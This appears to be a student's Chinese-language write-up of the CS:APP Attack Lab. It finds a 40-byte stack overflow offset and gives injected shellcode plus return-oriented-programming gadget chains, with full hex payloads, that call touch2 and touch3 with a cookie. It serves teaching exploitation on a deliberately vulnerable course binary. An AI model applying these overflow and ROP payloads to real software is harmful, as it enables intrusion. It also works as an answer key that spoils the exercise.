# Attack Lab

x86-64 架构的寄存器：

- 用来传参数的寄存器：%rdi, %rsi, %rdx, %rcx, %r8, %r9
- 保存返回值的寄存器：%rax
- 被调用者保存状态：%rbx, %r12, %r13, %r14, %rbp, %rsp
- 调用者保存状态：%rdi, %rsi, %rdx, %rcx, %r8, %r9, %rax, %r10, %r11
- 栈指针：%rsp
- 指令指针：%rip

找溢出点

![Untitled](Attack%20Lab%2075e95a90b58f4b7aa6fb1412c10c62f6/Untitled.png)

看他的参数存在哪个寄存器

![Untitled](Attack%20Lab%2075e95a90b58f4b7aa6fb1412c10c62f6/Untitled%201.png)

buf到返回地址有40个字节的距离，直接构造栈打就行

touch2和touch3需要构造传入参数rdi使得cmp通过

```python
movq    $0x59b997fa, %rdi  
pushq   0x4017ec           /** 跳转到touch2 **/
ret
```

![Untitled](Attack%20Lab%2075e95a90b58f4b7aa6fb1412c10c62f6/Untitled%202.png)

构造rop

```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00 // pop rdi 
fa 97 b9 59 00 00 00 00 // cookie
ec 17 40 00 00 00 00 00 //ret
```

最后一关，cookie是字符串，不能直接传参给rdi，需要通过写入固定位置方式间接传参

第一种（[参考](https://www.jianshu.com/p/db731ca57342)

![Untitled](Attack%20Lab%2075e95a90b58f4b7aa6fb1412c10c62f6/Untitled%203.png)

```python
0x401a06:
    mov %rsp, %rax // 控制栈顶进入rax，因为地址随机化，通过这种方式拿到栈地址
    retq
0x4019a2: 
    mov %rax, %rdi // 把rax装入rdi
    retq
0x4019cc:
	pop %rax // pop到rax
	retq  
0x4019dd:
    mov %eax, %edx // 移动eax到edx
    retq 
0x401a70:
    mov %edx, %ecx // 移动edx到ecx
    retq  
0x401a13:
    mov %ecx, %esi // 移动ecx到esi
    retq
0x4019d6: 
    lea (%rdi,%rsi,1),%rax // rdi和rsi相加进入rax
    retq
0x4019a2: 
    mov %rax, %rdi // 把rax装入rdi
    retq

00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 // mov %rsp, %rax 返回地址
a2 19 40 00 00 00 00 00 // mov %rax, %rdi 
cc 19 40 00 00 00 00 00 // pop %rax
48 00 00 00 00 00 00 00 // 偏移,返回地址和字符串首地址之间有9条指令，0x48，就是cookie的地址
dd 19 40 00 00 00 00 00 // mov %eax, %edx
70 1a 40 00 00 00 00 00 // mov %edx, %ecx 
13 1a 40 00 00 00 00 00 // mov %ecx, %esi
d6 19 40 00 00 00 00 00 // lea (%rdi,%rsi,1),%rax，上面的主要就是为了这条那到cookie
a2 19 40 00 00 00 00 00 // mov %rax, %rdi , 传入touch3的参数
fa 18 40 00 00 00 00 00 // addr of touch3
35 39 62 39 39 37 66 61 // cookie
```

第二种

```python
401a06: 48 89 e0              movq %rsp, %rax
401a09: c3                    retq

4019d8: 04 37                 add 0x37, %al //拉开与栈的距离，保证字符串被被解析成指令执行
4019da: c3                    retq

4019a2: 48 89 c7              movq %rax, %rdi
4019a5: c3                    retq

31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
06 1a 40 00 00 00 00 00 // movq %rsp, %rax
d8 19 40 00 00 00 00 00 // add $0x37, %al
a2 19 40 00 00 00 00 00 // movq %rax, %rdi
fa 18 40 00 00 00 00 00 // touch3
31 31 31 31 31 31 31 31 // padding 23byte to fit 0x37byte
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31
31 31 31 31 31 31 31
35 39 62 39 39 37 66 61 //cookie
```

还是pwntool好用捏